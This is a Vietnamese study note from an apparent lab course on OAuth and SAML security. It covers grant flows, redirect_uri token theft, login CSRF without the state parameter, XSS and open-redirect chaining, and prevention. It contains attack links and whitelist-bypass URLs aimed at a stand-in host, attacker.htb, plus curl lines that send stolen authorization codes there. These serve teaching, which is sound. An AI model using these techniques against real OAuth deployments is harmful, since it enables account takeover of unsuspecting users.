6. Máy chủ tài nguyên xác thực token và cung cấp tài nguyên cho client.

### **Ví dụ minh họa về OAuth**
Giả sử:
- **Resource Owner**: Người dùng tên John.
- **Client**: Nền tảng đào tạo an ninh mạng `academy.htb`.
- **Authorization Server và Resource Server**: `hubgit.htb`.

#### **Luồng thực hiện:**
1. John truy cập `academy.htb` và chọn đăng nhập bằng tài khoản `hubgit.htb`.
2. John đăng nhập vào `hubgit.htb` và chấp thuận cho `academy.htb` truy cập thông tin hồ sơ của mình.
3. `hubgit.htb` phát hành một mã ủy quyền (authorization code) cho `academy.htb`.
4. `academy.htb` gửi mã ủy quyền này đến `hubgit.htb` để yêu cầu token truy cập.
5. `hubgit.htb` xác nhận mã ủy quyền và cấp token truy cập cho `academy.htb`.
6. `academy.htb` sử dụng token truy cập để yêu cầu thông tin hồ sơ của John từ `hubgit.htb`.

### **Các loại Grant phổ biến trong OAuth**
#### **1. Authorization Code Grant (Grant mã ủy quyền)**
Đây là loại grant phổ biến và an toàn nhất.

**Bước 1: Yêu cầu ủy quyền**
```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=code&scope=user&state=a45c12e87d4522 HTTP/1.1
Host: hubgit.htb
```

**Bước 2: Xác thực người dùng**
- John đăng nhập và chấp thuận quyền truy cập.

**Bước 3: Nhận mã ủy quyền**
- `hubgit.htb` chuyển hướng trình duyệt đến URL callback của `academy.htb` với mã ủy quyền:
```http
GET /callback?code=ptsmyq2zxyvv23bl&state=a45c12e87d4522 HTTP/1.1
Host: academy.htb
```

**Bước 4: Yêu cầu token truy cập**
```http
POST /token HTTP/1.1
Host: hubgit.htb
client_id=1337&client_secret=SECRET&redirect_uri=http://academy.htb/callback&grant_type=authorization_code&code=ptsmyq2zxyvv23bl
```

**Bước 5: Nhận token truy cập**
```json
{
  "access_token": "RsT5OjbzRn430zqMLgV3Ia",
  "expires_in": 3600
}
```

**Bước 6: Yêu cầu tài nguyên**
```http
GET /user_info HTTP/1.1
Host: hubgit.htb
Authorization: Bearer RsT5OjbzRn430zqMLgV3Ia
```

**Bước 7: Phản hồi tài nguyên**
```json
{
  "username": "john",
  "email": "[email protected]",
  "id": 1337
}
```

#### **2. Implicit Grant (Grant ủy quyền ngầm)**
Grant này nhanh hơn nhưng kém an toàn hơn do token truy cập được trao trực tiếp cho client mà không qua mã ủy quyền.

**Bước 1: Yêu cầu ủy quyền với response_type là `token`**
```http
GET /auth?client_id=1337&redirect_uri=http://academy.htb/callback&response_type=token&scope=user&state=a45c12e87d4522 HTTP/1.1
Host: hubgit.htb
```

**Bước 2: Nhận token truy cập trực tiếp**
```http
GET /callback#access_token=RsT5OjbzRn430zqMLgV3Ia&token_type=Bearer&expires_in=3600&scope=user&state=a45c12e87d4522
```

---
# 1. Thiết lập môi trường lab OAuth (OAuth Lab Setup)

Trong phần này, chúng ta sẽ thiết lập môi trường lab để tìm hiểu về các lỗ hổng liên quan đến OAuth. Lab sẽ bao gồm các thành phần chính và tập trung vào luồng **Authorization Code Flow**, loại grant phổ biến và an toàn nhất trong OAuth.

#### **Cấu trúc của lab:**
1. **OAuth Client**: Nền tảng đào tạo an ninh mạng giả định `academy.htb`. Tất cả các route của client nằm dưới `/client/`.
2. **OAuth Resource Server** và **Authorization Server**: Được giả lập bởi nền tảng quản lý mã nguồn `hubgit.htb`. Các route nằm dưới `/resource/` và `/authorization/`.
3. **Attacker Server**: Một server giả lập dưới tên `attacker.htb`, được sử dụng để mô phỏng các tấn công và đánh cắp dữ liệu.

### **Luồng OAuth trong lab**
- Khi người dùng truy cập `academy.htb` và chọn đăng nhập bằng tài khoản `hubgit.htb`, quy trình xác thực OAuth sẽ bắt đầu:
  1. **Authorization Request**: Yêu cầu ủy quyền được gửi đến `hubgit.htb`.
  2. **Resource Owner Authentication**: Người dùng đăng nhập vào `hubgit.htb`.
  3. **Authorization Grant**: Sau khi xác thực, `hubgit.htb` cấp mã ủy quyền và chuyển hướng lại trình duyệt đến `academy.htb`.
  4. **Access Token Request**: `academy.htb` sử dụng mã ủy quyền để yêu cầu token truy cập từ `hubgit.htb`. Yêu cầu này được thực hiện trực tiếp từ server của `academy.htb` nên không hiển thị trên proxy.
  5. **Access Token Grant**: `hubgit.htb` cấp token truy cập cho `academy.htb`.
  6. **Resource Request**: `academy.htb` sử dụng token truy cập để yêu cầu thông tin người dùng từ `hubgit.htb`.
  7. **Resource Response**: `hubgit.htb` trả về thông tin người dùng.

### **Cấu hình các thành phần trong lab**
1. **OAuth Client (academy.htb)**:
   - Địa chỉ: `/client/`
   - Cho phép người dùng đăng nhập bằng OAuth thông qua `hubgit.htb`.

2. **OAuth Resource Server và Authorization Server (hubgit.htb)**:
   - Địa chỉ: `/resource/` và `/authorization/`
   - Lưu trữ tài nguyên và xử lý yêu cầu ủy quyền.

3. **Attacker Server (attacker.htb)**:
   - Địa chỉ: `attacker.htb`
   - Ghi log tất cả các yêu cầu GET, POST, và HTTP headers. Dữ liệu log có thể truy cập qua endpoint `/log`.

**Ví dụ yêu cầu POST tới attacker.htb:**
```bash
curl -X POST --data 'param1=Hello' http://attacker.htb/?param2=World
```

**Xem log yêu cầu:**
```bash
curl http://attacker.htb/log
```

**Kết quả log:**
```
param1=Hello
param2=World
Host: attacker.htb
User-Agent: curl/7.88.1
```

### **Mô phỏng quy trình OAuth trong lab**
1. Người dùng truy cập `academy.htb/client/` và chọn đăng nhập bằng tài khoản `hubgit.htb`.
2. `academy.htb` gửi yêu cầu ủy quyền tới `hubgit.htb` thông qua `/authorization/`.
3. Người dùng đăng nhập vào `hubgit.htb` và cấp quyền truy cập.
4. `hubgit.htb` cấp mã ủy quyền và chuyển hướng trình duyệt đến `academy.htb`.
5. `academy.htb` sử dụng mã ủy quyền để yêu cầu token truy cập từ `/authorization/` của `hubgit.htb`.
6. `hubgit.htb` cấp token truy cập, và `academy.htb` sử dụng token này để yêu cầu thông tin người dùng từ `/resource/`.

### **Sử dụng Attacker Server để đánh cắp dữ liệu**
- **Attacker Server (`attacker.htb`)** sẽ được sử dụng để mô phỏng các tấn công, bao gồm việc đánh cắp mã ủy quyền hoặc token truy cập bằng cách exfiltrate dữ liệu.
- Hacker có thể tạo yêu cầu HTTP tới `attacker.htb` để gửi dữ liệu đánh cắp:
  ```bash
  curl -X POST --data 'code=authorization_code' http://attacker.htb/log
  ```

---
# 2. Stealing Access Tokens (Lấy Cắp Access Token)

OAuth là một giao thức được sử dụng để xác thực và cấp quyền truy cập vào các tài nguyên. Tuy nhiên, nếu không được bảo mật đúng cách, nó có thể bị lợi dụng để lấy cắp token truy cập (access token) của người dùng, cho phép kẻ tấn công giả mạo người dùng và truy cập vào tài nguyên của họ. Một trong những lỗ hổng phổ biến là việc không kiểm tra kỹ càng tham số `redirect_uri` trong OAuth flow.

### Cách Tấn Công:
1. **Tạo liên kết tấn công**: Kẻ tấn công sẽ tạo ra một liên kết yêu cầu cấp phép OAuth chứa tham số `redirect_uri` bị thay đổi, trỏ đến máy chủ của kẻ tấn công.
2. **Sử dụng `state`**: Tham số `state` là một giá trị tùy ý, giúp kẻ tấn công theo dõi tiến trình tấn công. Kẻ tấn công có thể chọn bất kỳ giá trị nào cho `state`, miễn là nó nhất quán trong suốt cuộc tấn công.
   
   Ví dụ, kẻ tấn công có thể tạo ra liên kết như sau:
   ```
   http://hubgit.htb/authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.htb/callback&state=somevalue
   ```
3. **Lừa nạn nhân**: Kẻ tấn công cần gửi liên kết này cho nạn nhân (bằng các phương thức như lừa đảo qua email hoặc social engineering).
4. **Nhận Authorization Code**: Khi nạn nhân truy cập liên kết, họ sẽ thấy giao diện đăng nhập của OAuth. Sau khi đăng nhập thành công, thay vì chuyển hướng trở lại ứng dụng hợp lệ, OAuth sẽ chuyển hướng đến máy chủ của kẻ tấn công, gửi về một authorization code.

5. **Thu thập Code**: Kẻ tấn công có thể thu thập authorization code từ logs của máy chủ tấn công. Ví dụ:
   ```
   curl http://attacker.htb/log----/callback?code=Z0FBQUFBQm1BeHdC...
   ```

6. **Hoàn tất OAuth Flow**: Kẻ tấn công sau đó có thể sử dụng authorization code này để yêu cầu access token từ máy chủ OAuth, qua đó chiếm quyền truy cập vào tài nguyên của nạn nhân.

7. **Giả mạo người dùng**: Kẻ tấn công sử dụng access token thu được để giả mạo nạn nhân và thực hiện các hành động thay mặt nạn nhân.

   Ví dụ yêu cầu dữ liệu người dùng với access token:
   ```
   GET /client/ HTTP/1.1
   Host: academy.htb
   Cookie: access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

### Ví Dụ Tấn Công:
1. Kẻ tấn công tạo liên kết tấn công như sau:
   ```
   http://hubgit.htb/authorization/auth?response_type=code&client_id=0e8f12335b0bf225&redirect_uri=http://attacker.htb/callback&state=somevalue
   ```
2. Kẻ tấn công gửi liên kết này cho nạn nhân.
3. Sau khi nạn nhân đăng nhập, thay vì nhận lại một mã ủy quyền tại URL hợp lệ, mã ủy quyền sẽ được gửi về máy chủ tấn công (`http://attacker.htb/callback`).
4. Kẻ tấn công thu thập mã ủy quyền từ logs.
5. Kẻ tấn công sử dụng mã ủy quyền để lấy token truy cập hợp lệ, từ đó có thể impersonate (giả mạo) người dùng và truy cập tài nguyên của họ.

### Bỏ Qua Kiểm Tra Lỗi:
Trong nhiều ứng dụng OAuth thực tế, việc kiểm tra `redirect_uri` có thể được thực hiện bằng cách sử dụng whitelist để chỉ cho phép một số URL nhất định. Tuy nhiên, nếu kiểm tra này không cẩn thận, kẻ tấn công có thể dễ dàng vượt qua bằng các phương thức như:
- Thay đổi subdomain: `http://academy.htb.attacker.htb/callback`
- Sử dụng Basic Authentication Credentials: `http://[email protected]/callback`
- Thêm query parameters: `http://attacker.htb/callback?a=http://academy.htb`
- Thêm URL fragments: `http://attacker.htb/callback#http://academy.htb`

Với các cách này, kẻ tấn công có thể dễ dàng vượt qua được cơ chế kiểm tra và thực hiện tấn công như trên.

---
# 3. Giải thích về "Improper CSRF Protection" trong OAuth

Trong OAuth, tham số `state` là một phần quan trọng trong việc bảo vệ chống lại các cuộc tấn công Cross-Site Request Forgery (CSRF). Khi tham số `state` không có hoặc không được kiểm tra đúng cách, kẻ tấn công có thể lợi dụng lỗ hổng này để thực hiện tấn công CSRF.

### Tấn công CSRF không có tham số `state`
Nếu trong một triển khai OAuth, tham số `state` bị thiếu hoặc không được sử dụng, kẻ tấn công có thể thực hiện một cuộc tấn công đăng nhập CSRF. Mục tiêu của cuộc tấn công này là lừa nạn nhân đăng nhập vào tài khoản của kẻ tấn công mà không biết.

#### Ví dụ:
1. **Kẻ tấn công thu thập mã ủy quyền (authorization code):** Kẻ tấn công gửi yêu cầu ủy quyền OAuth và đăng nhập bằng thông tin tài khoản của mình. Sau đó, kẻ tấn công nhận được mã ủy quyền hợp lệ cho tài khoản của mình.
   
   ```http
   POST /authorization/signin HTTP/1.1
   Host: hubgit.htb
   Content-Length: 96
   Content-Type: application/x-www-form-urlencoded
   username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback
   ```

2. **Tạo đường dẫn tấn công:** Kẻ tấn công tạo một đường dẫn OAuth để cấp quyền bằng cách sử dụng mã ủy quyền đã có.
   
   ```http
   http://hubgit.htb/client/callback?code=Z0FBQUFBQm1BekxRVGFLdTk5WHZycU9zZ0dCS2IzaWwzWTkxME9tVHJPbXpibTVLV0g0MVRyUVhCSF9vVHVNSHdXX0NZV2FzTHEzTzRFLW5wejU5ai1ONVdxMlc0LU0wMDdURXVPRGYtX05Mb21mZTljTUtzTWwxa1pvdktUVzlWcXJFNzMtZGJ1eWtKcllFQy0xd3RlM3JXUzczUEUtU3lnP0
   ```

3. **Tấn công bằng phishing hoặc social engineering:** Kẻ tấn công gửi đường dẫn này cho nạn nhân thông qua kỹ thuật như phishing. Khi nạn nhân nhấp vào đường dẫn, trình duyệt của họ sẽ tự động thực hiện quy trình OAuth và thay đổi mã ủy quyền thành mã truy cập, đồng thời đăng nhập vào tài khoản của kẻ tấn công mà không hay biết.

### Cách tham số `state` ngăn ngừa tấn công
Tham số `state` có vai trò quan trọng trong việc ngăn ngừa các cuộc tấn công CSRF. Tham số này giúp xác minh tính hợp lệ của yêu cầu OAuth, đảm bảo rằng yêu cầu đến từ chính người dùng đã yêu cầu trước đó.

#### Ví dụ bảo vệ:
1. **Kẻ tấn công gửi yêu cầu đăng nhập:** Giống như trước, kẻ tấn công gửi yêu cầu đăng nhập và lấy mã ủy quyền.

   ```http
   POST /authorization/signin HTTP/1.1
   Host: hubgit.htb
   Content-Length: 96
   Content-Type: application/x-www-form-urlencoded
   username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=%2Fclient%2Fcallback&state=1337
   ```

2. **Tạo đường dẫn với mã ủy quyền:** Kẻ tấn công sử dụng mã ủy quyền đã có và tham số `state` là `1337`.

   ```http
   http://hubgit.htb/client/callback?code=Z0FBQUFBQm1BelRBRnlnUmRkQXRaclFtaEhFcUhHZ2ZQRURnaEN2bWIxRXEteXhGc2RuMVdWY3FZS1lGMnRrejdMOEEzYUMzS3ZIZlM3OEpVNGNFWmswZ2VKdjV4a2lTMmFpb2NDRFJ5QmFqOVFaUmI1WS1YM0xoVWVOUnhMZ1FJV29sLWN0ZE9sMXZOUzZkYmZBSk9hb25MbW54bnY1QWZ3PT0&state=1337
   ```

3. **Kiểm tra tham số `state` của nạn nhân:** Khi nạn nhân nhấp vào đường dẫn, hệ thống OAuth sẽ phát hiện sự không khớp giữa giá trị `state` trong yêu cầu và giá trị `state` trong cookie của nạn nhân (do nạn nhân đã thực hiện OAuth trước đó). Vì vậy, yêu cầu bị từ chối và quy trình OAuth bị hủy.

*** Tóm lại***:
Tham số `state` giúp ngăn ngừa các cuộc tấn công CSRF bằng cách bảo vệ xác minh tính hợp lệ của yêu cầu. Nếu tham số này bị thiếu hoặc không được kiểm tra đúng cách, kẻ tấn công có thể lừa nạn nhân thực hiện các hành động không mong muốn như đăng nhập vào tài khoản của kẻ tấn công mà không hay biết.

---
# 4. Các Lỗ Hổng Bảo Mật OAuth

Sau khi đã thảo luận về các lỗ hổng phổ biến có thể xảy ra do việc triển khai OAuth không đúng cách, chúng ta sẽ tiếp tục với những lỗ hổng bảo mật khác có thể phát sinh liên quan đến việc triển khai OAuth sai.

### Cross-Site Scripting (XSS)

Một trong những lỗ hổng phổ biến nhất trên web là Cross-Site Scripting (XSS), đặc biệt là XSS phản chiếu (reflected XSS). Như tên gọi của nó, XSS phản chiếu có thể xảy ra khi một giá trị từ yêu cầu (request) được phản chiếu lại trong phản hồi (response). Điều này rất phổ biến trong các dòng chảy OAuth.

Trong ví dụ về yêu cầu ủy quyền (authorization request) trong bài lab của chúng ta, có ba tham số từ yêu cầu của chúng ta được phản chiếu dưới dạng các giá trị ẩn trong phản hồi (hidden values):

Nếu ứng dụng web không vệ sinh đúng cách các giá trị này, chúng có thể dẫn đến lỗ hổng XSS phản chiếu. Để kiểm tra các giá trị này, chúng ta có thể thử tiêm một đoạn mã XSS cơ bản, chẳng hạn như:

```html
<script>alert('XSS');</script>
```

Nếu lỗ hổng XSS có mặt trong yêu cầu ủy quyền, điều này có thể ảnh hưởng đến máy chủ ủy quyền và có thể dẫn đến việc chiếm đoạt tài khoản hoàn toàn của nạn nhân.

### Mở Redirect & Các Lỗ Hổng Chuỗi

Như đã thảo luận trong một số phần trước, tham số `redirect_uri` có thể bị khai thác để đánh cắp mã ủy quyền (authorization code) của nạn nhân. Tuy nhiên, loại lỗ hổng này có thể dễ dàng được ngăn chặn bằng cách triển khai các kiểm tra whitelist đối với URL chuyển hướng. Thường thì việc này được thực hiện bằng cách kiểm tra nguồn gốc (origin) của URL, bao gồm giao thức, máy chủ và cổng của URL so với một giá trị đã được đưa vào whitelist. Điều này cho phép ứng dụng khách di chuyển điểm cuối callback mà không làm gián đoạn toàn bộ dòng chảy OAuth, đồng thời ngăn chặn một kẻ tấn công điều chỉnh URL chuyển hướng đến hệ thống do chúng kiểm soát.

Mặc dù việc này có vẻ an toàn, nhưng khi kết hợp với việc triển khai redirect mở (open redirect) trong ứng dụng web của ứng dụng khách, tình hình có thể thay đổi. Ví dụ, một ứng dụng web có thể có một endpoint chuyển hướng mở, cho phép chuyển hướng tới bất kỳ URL nào được cung cấp trong tham số `url`.

Giả sử, ứng dụng khách OAuth `academy.htb` lưu trữ điểm cuối callback của mình tại `http://academy.htb/callback` và triển khai một chuyển hướng mở tại `http://academy.htb/redirect`, với tham số `url` có thể chuyển hướng tới bất kỳ URL nào. Máy chủ ủy quyền `hubgit.htb` kiểm tra tham số `redirect_uri` trong yêu cầu ủy quyền và chỉ chấp nhận các URL thuộc danh sách cho phép `http://academy.htb/`.

Trong trường hợp này, một kẻ tấn công có thể tạo một yêu cầu ủy quyền với URL chuyển hướng bị thao túng như sau:

```
http://academy.htb/redirect?u=http://attacker.htb/callback
```

URL này sẽ qua được kiểm tra whitelist của máy chủ ủy quyền. Tuy nhiên, sau khi nạn nhân xác thực thành công, mã ủy quyền sẽ được gửi đến `http://academy.htb/redirect`, và sau đó bị chuyển hướng đến `http://attacker.htb/callback`. Do đó, kẻ tấn công có thể nhận được mã ủy quyền mà không cần vượt qua bất kỳ kiểm tra nào đối với tham số `redirect_uri`.

### Lợi Dụng Một Client Độc Hại

Đến nay, chúng ta đã giả định rằng kẻ tấn công là một đối tượng bên ngoài không có mặt trong dòng chảy OAuth. Tuy nhiên, hầu hết các máy chủ ủy quyền hỗ trợ đăng ký client OAuth, cho phép kẻ tấn công tạo ra một client OAuth độc hại dưới sự kiểm soát của chúng. Kẻ tấn công có thể sử dụng client này để thu thập mã truy cập (access token) từ những nạn nhân không biết, mà có thể được sử dụng trong các ứng dụng OAuth triển khai không đúng cách để mạo danh nạn nhân.

Ví dụ, kẻ tấn công có thể tạo một ứng dụng web `evil.htb` và đăng ký nó làm client OAuth với `hubgit.htb` để cho phép xác thực OAuth. Nếu một nạn nhân không biết đăng nhập vào `evil.htb` bằng tài khoản `hubgit.htb` của họ thông qua OAuth, client độc hại sẽ nhận được mã truy cập của người dùng từ `hubgit.htb`. Kẻ tấn công có thể sử dụng mã truy cập này để truy cập vào `academy.htb`. Nếu client `academy.htb` không kiểm tra rằng mã truy cập đã được cấp phát cho một client khác và cấp quyền, kẻ tấn công có thể mạo danh nạn nhân trên `academy.htb`.

---
# 5. Phòng Ngừa Lỗ Hổng OAuth

Như chúng ta đã thấy, có nhiều cách mà việc triển khai không đúng cách dòng chảy OAuth có thể dẫn đến các lỗ hổng trên web. Một số lỗ hổng này có thể gây ra hậu quả nghiêm trọng, bao gồm việc rò rỉ toàn bộ phiên người dùng. Để ngăn ngừa những lỗ hổng này, tất cả các thực thể OAuth phải thực hiện các biện pháp bảo mật nghiêm ngặt. Đặc biệt, máy chủ ủy quyền và ứng dụng khách phải thực hiện và tuân thủ nghiêm ngặt tất cả các khía cạnh của giao thức OAuth.

### Phòng Ngừa Lỗ Hổng OAuth

1. **Tuân thủ nghiêm ngặt chuẩn OAuth**: Để ngăn chặn các lỗ hổng từ việc triển khai sai, chuẩn OAuth phải được tuân thủ nghiêm ngặt đối với tất cả các thực thể OAuth. Điều này bao gồm việc xác thực tất cả các yêu cầu và phản hồi OAuth một cách kỹ lưỡng.

2. **Chống lại các lỗ hổng CSRF**: Mặc dù chuẩn OAuth không yêu cầu nghiêm ngặt, nhưng để ngăn ngừa các lỗ hổng CSRF, tham số `state` phải được thực thi bởi máy chủ ủy quyền và được triển khai bởi ứng dụng khách. Tham số này giúp đảm bảo rằng yêu cầu đến là hợp lệ và không bị giả mạo.

3. **Sử dụng Authorization Code Grant thay vì Implicit Grant**: Ứng dụng khách nên ưu tiên sử dụng grant type là authorization code thay vì implicit grant, nếu có thể. Implicit grant dễ bị lộ mã thông báo truy cập (access token) và dễ bị tấn công hơn.

4. **Xác thực nghiêm ngặt các redirect URIs**: Máy chủ ủy quyền OAuth cần phải kiểm tra kỹ lưỡng các redirect URI để đảm bảo chúng thuộc về các miền đáng tin cậy và từ chối các yêu cầu với URL chuyển hướng đáng ngờ hoặc không được phép.

5. **Lưu trữ và truyền tải mã truy cập an toàn**: Ứng dụng khách cần lưu trữ mã truy cập (access token) một cách an toàn và đảm bảo rằng mã này được truyền tải qua các kênh bảo mật, chẳng hạn như HTTPS, để ngăn chặn việc bị đánh cắp hoặc chặn mã truy cập.

6. **Áp dụng các biện pháp bảo mật chung cho hệ thống**: Các biện pháp bảo mật chung đối với hệ thống chịu trách nhiệm triển khai OAuth là rất quan trọng. Điều này bao gồm việc thực hiện các cuộc kiểm tra bảo mật định kỳ, kiểm tra thâm nhập (penetration testing), và rà soát mã nguồn (code reviews). Các hoạt động này giúp phát hiện và giảm thiểu các lỗ hổng trong việc triển khai OAuth đồng thời giúp ứng dụng theo kịp các mối đe dọa và các phương pháp bảo mật mới nhất.

7. **Triển khai các cơ chế xác thực mạnh mẽ**: Việc triển khai các cơ chế xác thực mạnh mẽ, chẳng hạn như xác thực đa yếu tố (MFA), là một phần quan trọng trong việc ngăn ngừa lỗ hổng. MFA giúp tăng cường bảo mật cho quá trình OAuth bằng cách yêu cầu người dùng xác minh danh tính qua nhiều yếu tố như mật khẩu, sinh trắc học hoặc mã một lần (OTP). Việc yêu cầu xác thực đa yếu tố giúp giảm thiểu đáng kể nguy cơ truy cập trái phép, ngay cả khi thông tin đăng nhập của người dùng bị xâm phạm.

---
---
# Giới Thiệu về SAML

Secure Assertion Markup Language (SAML) là một chuẩn dựa trên XML giúp thực hiện xác thực và ủy quyền giữa các bên, đồng thời có thể được sử dụng để triển khai SSO (Single Sign-On). Trong SAML, dữ liệu được trao đổi trong các tài liệu XML có chữ ký số để đảm bảo tính toàn vẹn của dữ liệu.

Trước khi tìm hiểu về các cuộc tấn công và cấu hình sai có thể dẫn đến các lỗ hổng bảo mật trong SAML, chúng ta hãy cùng xem xét cách thức hoạt động của nó.

### Các Thành Phần của SAML

SAML bao gồm các thành phần sau:

1. **Identity Provider (IdP)**: Là thực thể chịu trách nhiệm xác thực người dùng. IdP cung cấp thông tin danh tính cho các thành phần khác và phát hành các tuyên bố SAML.
   
2. **Service Provider (SP)**: Là thực thể cung cấp dịch vụ hoặc tài nguyên cho người dùng. Nó dựa vào các tuyên bố SAML do IdP cung cấp.

3. **SAML Assertions**: Là dữ liệu dựa trên XML chứa thông tin về trạng thái xác thực và ủy quyền của người dùng.

### Quy Trình SAML

Tương tự như OAuth, SAML có một quy trình đã được định nghĩa trước. Trên một mức độ trừu tượng, quy trình SAML như sau:

1. Người dùng truy cập vào một tài nguyên do SP cung cấp.
2. Vì người dùng chưa được xác thực, SP bắt đầu quá trình xác thực bằng cách chuyển hướng người dùng đến IdP với một yêu cầu SAML.
3. Người dùng thực hiện xác thực với IdP.
4. IdP tạo ra một tuyên bố SAML chứa thông tin người dùng, ký số tuyên bố SAML và gửi nó trong phản hồi HTTP đến trình duyệt. Trình duyệt gửi tuyên bố SAML đến SP.
5. SP xác minh tuyên bố SAML.
6. Người dùng yêu cầu tài nguyên.
7. SP cung cấp tài nguyên.

### Ví Dụ về Quy Trình SAML

Giống như OAuth, chúng ta sẽ đi qua một ví dụ cụ thể để đảm bảo hiểu rõ quy trình SAML. Giả sử người dùng **John** muốn truy cập SP **academy.htb** bằng thông tin đăng nhập từ **sso.htb** của mình. Quy trình SAML sẽ như sau:

#### Bước 1 & 2: Yêu Cầu Xác Thực

John truy cập **academy.htb**. Vì đây là yêu cầu chưa được xác thực, SP sẽ chuyển hướng John đến IdP **sso.htb** với một yêu cầu SAML như sau:

```xml
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" 
    ID="ONELOGIN_809707f0030a5d00620c9d9df97f627afe9dcc24" Version="2.0" ProviderName="SP test" IssueInstant="2014-07-16T23:52:45Z" 
    Destination="http://sso.htb/idp/SSOService.php" ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" 
    AssertionConsumerServiceURL="http://academy.htb/index.php">
    <saml:Issuer>http://academy.htb/index.php</saml:Issuer>
    <samlp:RequestedAuthnContext Comparison="exact">
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
    </samlp:RequestedAuthnContext>
</samlp:AuthnRequest>
```

Yêu cầu SAML này chứa các tham số sau:
- **Destination**: Địa chỉ nơi trình duyệt sẽ gửi yêu cầu SAML.
- **AssertionConsumerServiceURL**: URL mà IdP phải gửi phản hồi đến sau khi xác thực.
- **saml:Issuer**: Người phát hành yêu cầu SAML.

#### Bước 3: Xác Thực

John thực hiện xác thực với **sso.htb** bằng tên người dùng và mật khẩu của mình. IdP xác minh thông tin đăng nhập và thực hiện xác thực thành công.

#### Bước 4: Tạo Tuyên Bố

Sau khi xác thực thành công, IdP tạo ra một tuyên bố SAML cho John. Tuyên bố này sẽ được gửi tới John trong một phản hồi HTTP. Trình duyệt của John sẽ chuyển tiếp tuyên bố SAML đến SP **academy.htb**. Tuyên bố SAML có dạng như sau:

```xml
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_1234567890" IssueInstant="2024-03-18T12:00:00Z" Version="2.0">
    <saml:Issuer>http://sso.htb/idp/</saml:Issuer>
    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">john@example.com</saml:NameID>
    </saml:Subject>
    <saml:AttributeStatement>
        <saml:Attribute Name="username" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
            <saml:AttributeValue>john</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
            <saml:AttributeValue>john@example.com</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
```

Tuyên bố SAML này chứa các tham số:
- **saml:Issuer**: Người phát hành tuyên bố SAML.
- **saml:Subject**: Đối tượng của tuyên bố SAML (người dùng).
- **saml:NameID**: Một định danh duy nhất cho đối tượng trong tuyên bố.
- **saml:AttributeStatement**: Danh sách các thuộc tính về đối tượng trong tuyên bố.

#### Bước 5: Xác Minh Tuyên Bố

SP sẽ xác minh tuyên bố SAML.

#### Bước 6 & 7: Truy Cập Tài Nguyên

Sau khi tuyên bố SAML được xác minh thành công, John có thể truy cập tài nguyên tại **academy.htb** mà không cần phải thực hiện xác thực thêm.

---
# 1. SAML Lab Setup

SAML (Security Assertion Markup Language) là một giao thức xác thực và ủy quyền giúp việc chuyển giao thông tin xác thực giữa các hệ thống trở nên dễ dàng. Trong ví dụ này, SAML được sử dụng giữa hai thành phần chính: **Service Provider (SP)** và **Identity Provider (IdP)**.

**1. Thành phần:**
- **Service Provider (SP)**: Đây là hệ thống mà người dùng muốn truy cập, ví dụ, một nền tảng đào tạo an ninh mạng, trong trường hợp này là **academy.htb**. Tuy nhiên, SP này không hỗ trợ đăng nhập trực tiếp mà phải thông qua SSO (Single Sign-On) với một IdP.
  
- **Identity Provider (IdP)**: Đây là dịch vụ xác thực người dùng, trong ví dụ này là **sso.htb**, nơi người dùng nhập thông tin xác thực (username và password) để đăng nhập.

**2. Quy trình SAML (SAML Flow):**
- **Bước 1**: Người dùng truy cập trang web của SP tại `http://academy.htb/`. Trang này không có form đăng nhập trực tiếp mà chỉ có một nút **Log in with our HackTheBox SSO** để người dùng được chuyển hướng tới IdP.
  
- **Bước 2**: Khi người dùng nhấn nút **Log in with our HackTheBox SSO**, họ sẽ được chuyển hướng đến IdP tại `http://sso.htb/`. Tại đây, người dùng nhập thông tin đăng nhập của mình.

- **Bước 3**: Sau khi đăng nhập thành công trên IdP, IdP sẽ tạo ra một SAML **request** (yêu cầu) và gửi trả về SP. Để gửi yêu cầu này, dữ liệu được mã hóa dưới dạng **Base64**. Dưới đây là ví dụ về một SAML request đã được mã hóa Base64:
  
  ```
  fVNNj9owFLzzK1DukA/SbWNBJAr9QKIQEbqHXirHfhRLie36OV3239dxsru02sUHR3qemTdjv8...
  ```

  Khi giải mã và giải nén, ta có thể thấy thông tin chi tiết của **SAML request** như sau (dưới dạng XML):

  ```xml
  <samlp:AuthnRequest
      ID="ONELOGIN_d9da469d44203bb0a13fa8996bea4471592101b9"
      Version="2.0"
      IssueInstant="2024-03-29T10:22:49Z"
      Destination="http://sso.htb/simplesaml/saml2/idp/SSOService.php"
      ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
      AssertionConsumerServiceURL="http://academy.htb/acs.php">
      <saml:Issuer>http://academy.htb/</saml:Issuer>
      <samlp:NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" AllowCreate="true" />
      <samlp:RequestedAuthnContext Comparison="exact">
          <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </samlp:RequestedAuthnContext>
  </samlp:AuthnRequest>
  ```

  - **Issuer**: Là SP (service provider), nơi yêu cầu xác thực.
  - **Destination**: Là nơi yêu cầu SAML được gửi tới, tức là IdP (Identity Provider).
  - **AssertionConsumerServiceURL**: Là URL mà IdP sẽ trả lại kết quả sau khi xác thực (có thể là `http://academy.htb/acs.php`).

- **Bước 4**: Sau khi IdP xác thực thành công, nó sẽ gửi lại một SAML **response** (phản hồi) đến SP. Phản hồi này chứa thông tin về người dùng và kết quả xác thực.

